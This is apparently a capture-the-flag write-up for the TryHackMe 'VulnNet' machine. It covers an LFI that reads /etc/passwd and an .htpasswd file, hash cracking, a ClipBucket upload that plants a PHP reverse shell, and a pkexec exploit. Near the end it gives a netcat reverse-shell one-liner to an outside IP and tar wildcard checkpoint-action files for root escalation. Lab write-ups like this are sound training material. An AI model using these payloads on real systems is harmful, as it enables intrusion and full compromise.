# VulnNet

## General Information

<h3>Difficulty: <img src="https://img.shields.io/badge/medium-orange?style=flat-square"> </h3>

<h3> Operating system: Linux </h3> 

<h3> Exploited vulnerability: Reverse shell, the binary pkexec and vulnerability Wildcard</h3>

<h3> Date of resolution: 13/07/2025 </h3>

<h3>Link Virtual Machine: <a href="https://tryhackme.com/room/vulnnet1" target="_blank">VulnNet</a></h3>

### *Read this document in english* <a href="Vulnnet.md">VulnNet</a>

## Recognition

TryHackme provides us with the target machine's IP address **target_ip**

I'm going to set the IP address of the target machine in the **/etc/hosts** file. I'm going to call it **the name you want to give it**

<p align="center"> 
<img src="images/hosts.png" width="600" alt="Resultado de Nmap">
</p>

### Ping

Depending on the result we can deduce whether it is a Linux or Windows machine, for example:

```
ping -c 1 vulnnet.thm
```

<p align="center"> 
<img src="images/ping.png" width="600" alt="Resultado de Nmap">
</p>

**If the ttl is 63. So it's Linux**

### Scanning for open ports

#### TCP port scanning

The command I use with nmap is:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn vulnnet.thm
```

<div align="center">

| Open port | Service | Version                         |
| --------- | ------- | ------------------------------- |
| 22        | ssh     | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80        | http    | Apache httpd 2.4.29             |

</div>

#### UDP port scanning

```
nmap -sU --top-ports 200 --min-rate=5000 -Pn vulnnet.thm
```

**No open ports**

## Exploration

### Fuzzing web 

```
gobuster dir -u http://ip_obejtivo/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
```

<p align="center"> 
<img src="images/fzw.png" width="600" alt="Resultado de Nmap">
</p>

I visit the route **/js**

<p align="center"> 
<img src="images/js.png" width="600" alt="Resultado de Nmap">
</p>

There are two JavaScript (.js) files. I use a better **js** viewer to read them better.

Another web fuzzing I do is the following:

```
wfuzz -c --hc=400 --hl=367 -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-20000.txt -H "Host: FUZZ.vulnnet.thm" -u vulnnet.thm
```

<p align="center"> 
<img src="images/fzw2.png" width="600" alt="Resultado de Nmap">
</p>

Then, I test broadcast as follows in the browser:

```
http://broadcast.vulnnet.thm/
```

<p align="center"> 
<img src="images/broadcast.png" width="600" alt="Resultado de Nmap">
</p>

We'll come back to this point later, but it's worth keeping in mind.

There are two ways to find a hidden link:

#### First form

Using the **LinkFinder** tool, as the name indicates it is based on finding hidden links, to install it we would use the following command:

```
git clone https://github.com/GerbenJavado/LinkFinder.git
cd LinkFinder
sudo python setup.py install
```

Then to use it in our CTF, we would use the following command:

```
python3 linkfinder.py -d -i http://vulnnet.thm/ -o cli
```

<p align="center"> 
<img src="images/linkfinder.png" width="600" alt="Resultado de Nmap">
</p>

#### Second form

Visiting the following route

```
http://vulnnet.thm/js/index__d8338055.js
```

<p align="center"> 
<img src="images/js2.png" width="600" alt="Resultado de Nmap">
</p>

I definitely stick with the first one.

```
http://vulnnet.thm/index.php?referer=
```
On the other hand, we are going to use another web fuzzing command like this:

### LFI

**What is LFI?**

*It is a web vulnerability that allows an attacker to **read files on the server's system** through crafted input.*

```
http://vulnnet.thm/index.php?referer=/etc/passwd
```
I put the following in the hidden link: **/etc/passwd** in order to find the users of the machine.

<p align="center"> 
<img src="images/server.png" width="600" alt="Resultado de Nmap">
</p>

So, from this, we can intuit that the **index.php?referer=** parameter is vulnerable and we can read critical system files.

Whenever we have a user, we should always test the following parameter: **/.ssh/id_rsa**

```
http://vulnnet.thm/index.php?referer=/home/server-management/.ssh/id_rsa
```

**but it didn't work for me :(**

First, we need to understand what the **.htpasswd** file is.

The .htpasswd file is a file used to store encrypted usernames and passwords on systems that use basic HTTP authentication, specifically with Apache (but it can also be used with Nginx or other web servers).

I search the following in my browser:

```
httpasswd default folder apache2
```

<p align="center"> 
<img src="images/htpasswd.png" width="600" alt="Resultado de Nmap">
</p>

I find something interesting **/etc/apache2/.htpasswd**

```
http://vulnnet.thm/index.php?referer=/etc/apache2/.htpasswd
```

<p align="center"> 
<img src="images/htpasswd2.png" width="600" alt="Resultado de Nmap">
</p>

### John The Ripper

I save what I got previously in a .txt and use john the ripper

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

<p align="center"> 
<img src="images/john.png" width="600" alt="Resultado de Nmap">
</p>

Therefore we have:

User: developers
Password: 9972761drmfsls

Remember that in this link we can enter username and password.

```
http://broadcast.vulnnet.thm/
```

<p align="center"> 
<img src="images/vulnnet.png" width="600" alt="Resultado de Nmap">
</p>

We managed to get in (it was difficult)**

## Exploration

I'm investigating how I can exploit the ClipBucket CMS, the good thing is that the browser tells me the version v4.0

<p align="center"> 
<img src="images/clip.png" width="600" alt="Resultado de Nmap">
</p>

In the browser I search

```
exploit clipbucket v4.0
```

And I find exploit-db

<p align="center"> 
<img src="images/exploit.png" width="600" alt="Resultado de Nmap">
</p>

Kali itself already has a reverse-shell, you can find it with this command:

```
locate reverse-shell 
```

<p align="center"> 
<img src="images/locate.png" width="600" alt="Resultado de Nmap">
</p>

Continuing with exploit-db, I find several techniques to access the user, but I stick with this one:

<p align="center"> 
<img src="images/exploit.png" width="600" alt="Resultado de Nmap">
</p>

```
curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
"http://$HOST/actions/beats_uploader.php"
```

But adapted to this exploit it would be like this:

```
curl -F "file=@reverse_shell.php" -F "plupload=1" -F "name=anyname.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php"
```

<p align="center"> 
<img src="images/autorizacion.png" width="600" alt="Resultado de Nmap">
</p>

But it's going to ask me for credentials. So the command would be like this:

```
curl -u developers:9972761drmfsls  -F "file=@reverse_shell.php" -F "plupload=1" -F "name=anyname.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php"
```

<p align="center"> 
<img src="images/yes.png" width="600" alt="Resultado de Nmap">
</p>

It has been saved in the **CB_BEATS_UPLOAD_DIR** folder.

I run a web fuzz to find where that folder is located with the following command:

```
gobuster dir -u http://broadcast.vulnnet.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -U developers -P 9972761drmfsls
```

<p align="center"> 
<img src="images/fzw3.png" width="600" alt="Resultado de Nmap">
</p>

Upon further investigation, I found that the **actions** folder is located in **CB_BEATS_UPLOAD_DIR**.

I prepare the command that would be the listening port:

```
nc -lvnp 4444
```

<p align="center"> 
<img src="images/nc.png" width="600" alt="Resultado de Nmap">
</p>

**I got in**

## Post-Exploitation

#### TTY

```
script /dev/null -c bash
```
**control z**

```
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```
### Privilege Escalation

#### First Form:

```
find / -perm -4000 2>/dev/null
```

<p align="center"> 
<img src="images/escalada.png" width="600" alt="Resultado de Nmap">
</p>

Whenever we have the opportunity to escalate privilege with **pkexec** we look into <a href="https://github.com/NxPnch/pkexec-exploit" target="_blank">google</a>

To download it with **wget** we would only have to go here and copy the url

<p align="center"> 
<img src="images/wget.png" width="600" alt="Resultado de Nmap">
</p>

```
wget https://raw.githubusercontent.com/NxPnch/pkexec-exploit/refs/heads/main/CVE-2021-4034.py
```

Then I change the name to make it easier

<p align="center"> 
<img src="images/wget2.png" width="600" alt="Resultado de Nmap">
</p>

I share the file with this command

```
python -m http.server 80
```

Then, located in the **/tmp** folder, I get the file with the following command:

```
wget http://ipMaquinaAtacante/CVE-2021-4034.py
```

<p align="center"> 
<img src="images/ymp.png" width="600" alt="Resultado de Nmap">
</p>

Then, we give it execution permission and execute

```
chmod +x exploit.py
./exploit.py
n
```

<p align="center"> 
<img src="images/n.png" width="600" alt="Resultado de Nmap">
</p>

**First flag**

```
cd /home/server-management
```

<p align="center"> 
<img src="images/flag.png" width="600" alt="Resultado de Nmap">
</p>

**Second flag**

``` 
cd /root
```

<p align="center"> 
<img src="images/flag2.png" width="600" alt="Resultado de Nmap">
</p>

-----------------------------------------

**This is the easy part, now I'm going to show what the longer part would be like, mainly because this could be part of the ejptv2 exam.**

### How do I log in as the server-management user?

First, we need to know what crontab is. Crontab is a tool in Linux used to schedule automatic tasks that run at specific times.

If we go to the /var/backups/ folder,

<p align="center"> 
<img src="images/backups.png" width="600" alt="Resultado de Nmap">
</p>

We see that there is a backup of the user **server-management** if we move it to the **/tmp** folder, we can extract it

```
tar -xzvf ssh-backup.tar.gz
```

<p align="center"> 
<img src="images/tar.png" width="600" alt="Resultado de Nmap">
</p>

We get the id_rsa file.

*The `id_rsa` file is your **SSH private key**, and is part of a key pair used for **secure passwordless authentication** on remote servers.*

but....

```
cat id_rsa
```

<p align="center"> 
<img src="images/idrsa.png" width="600" alt="Resultado de Nmap">
</p>

This one in particular is encrypted, so we'll decrypt it with John the Ripper on our attacker machine.

On our attacker machine, we'll run the following commands:

```
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

<p align="center"> 
<img src="images/john2.png" width="600" alt="Resultado de Nmap">
</p>

**User**: server-management\
**Password**: oneTWO3gOyac

We must not forget that we must give permission to the id_rsa file that only the user can use, otherwise it will not work.

```
chmod 600 id_rsa
```

Then, we tried to get in via ssh

```
ssh -i id_rsa server-management@vulnnet.thm
```

<p align="center"> 
<img src="images/idrsa2.png" width="600" alt="Resultado de Nmap">
</p>

**We are logged in as the server-management user**

### How do I escalate privileges with crontab?

```
cat /etc/crontab
```

<p align="center"> 
<img src="images/crontab.png" width="600" alt="Resultado de Nmap">
</p>

We observe what a backupsrv.sh does and we try to understand this script

```
cat /var/opt/backupsrv.sh
```

<p align="center"> 
<img src="images/backups.png" width="600" alt="Resultado de Nmap">
</p>

This script consists of:

Makes a compressed (.tgz) copy of the entire contents of **/home/server-management/Documents.**

Save this copy to **/var/backups**

The backup name includes the computer name and the day of the week.

This allows you to have a different backup every day, such as:

```
myserver-Monday.tgz
myserver-Tuesday.tgz
```

This page explains how to exploit the Wildcard vulnerability. https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/ 

To do this, on our attacking machine, we write the following:

```
msfvenom -p cmd/unix/reverse_netcat lhost=10.8.139.36 lport=8888 R
```

<p align="center"> 
<img src="images/msfvenom.png" width="600" alt="Resultado de Nmap">
</p>

Then on our victim machine we write this

```
echo "mkfifo /tmp/izrwvv; nc 10.8.139.36 8888 0</tmp/izrwvv | /bin/sh >/tmp/izrwvv 2>&1; rm /tmp/izrwvv" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

We leave the listening port activated on our attacking machine

```
nc -lvnp 8888
```

In just a minute or so we managed to access as **root**

<p align="center"> 
<img src="images/root.png" width="600" alt="Resultado de Nmap">
</p>

**Finished machine**

## Conclusion

This machine was quite complicated for me at first, because I had to learn new things, such as looking at the page source code when executing LFI commands. On the other hand, I reviewed John the Ripper, and learned how to read vulnerabilities in exploit-db. All of this just to access the system. Finally, privilege escalation was easier for me because the **pkexec** binary was present; once carried out, I managed to become root. Looking at other write-ups with the aim of seeing other ways to escalate privileges, I learned that it could be exploited with the **Wildcard** vulnerability. You also review essential files like **id_rsa**. A Medium-level machine, which is sincerely noticeable, in which I feel I have learned a lot.